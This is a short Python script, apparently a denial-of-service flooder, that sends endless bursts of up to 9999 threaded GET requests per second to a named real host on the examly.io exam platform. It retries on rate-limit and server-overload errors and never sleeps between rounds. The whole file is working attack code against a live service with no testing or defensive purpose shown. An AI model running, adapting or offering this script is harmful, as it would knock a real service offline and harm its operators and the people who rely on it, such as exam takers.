import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# List of target URLs
urls = [
    'https://rmk685.examly.io',
    'https://rmk685.examly.io',
    'https://rmk685.examly.io'
]

# The number of requests to send per second for each URL
requests_per_url_per_second = 9999  # Adjust this number as needed

# Retry configuration
retry_strategy = Retry(
    total=3,  # Number of total retries
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["HEAD", "GET", "OPTIONS"]  # Changed from method_whitelist
)
adapter = HTTPAdapter(max_retries=retry_strategy)
http = requests.Session()
http.mount("https://", adapter)
http.mount("http://", adapter)

def send_request(url):
    try:
        response = http.get(url)
        print(f'{url}: Status Code: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'{url}: Error: {e}')

def run_requests(url, requests_per_second):
    with ThreadPoolExecutor(max_workers=requests_per_second) as executor:
        futures = [executor.submit(send_request, url) for _ in range(requests_per_second)]
        # Wait for all requests to complete
        for future in futures:
            future.result()

if __name__ == '__main__':
    while True:
        start_time = time.time()
        
        # Run the request sending process for each URL in parallel
        threads = []
        for url in urls:
            thread = threading.Thread(target=run_requests, args=(url, requests_per_url_per_second))
            thread.start()
            threads.append(thread)
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        elapsed_time = time.time() - start_time
        time_to_wait = max(0, 1 - elapsed_time)
        
